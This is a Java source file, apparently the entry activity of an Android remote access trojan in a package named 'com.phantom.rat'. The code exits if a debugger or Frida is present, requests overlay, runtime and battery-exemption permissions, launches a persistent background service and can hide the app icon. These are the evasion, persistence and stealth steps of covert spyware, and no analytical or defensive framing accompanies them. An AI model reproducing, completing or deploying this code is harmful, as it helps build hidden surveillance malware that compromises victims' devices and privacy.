package com.phantom.rat;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (FudUtils.isDebugged() || FudUtils.fridaPresent()) {
            android.os.Process.killProcess(android.os.Process.myPid());
            return;
        }
        PermissionHelper.requestRuntime(this);
        PermissionHelper.requestOverlay(this);
        PermissionHelper.requestBatteryIgnore(this);
        Intent i = new Intent(this, CoreService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
        else startService(i);
        if ("true".equals(FudUtils.config(this, "icon_hidden", "false"))) FudUtils.hideIcon(this);
        finish();
    }
}
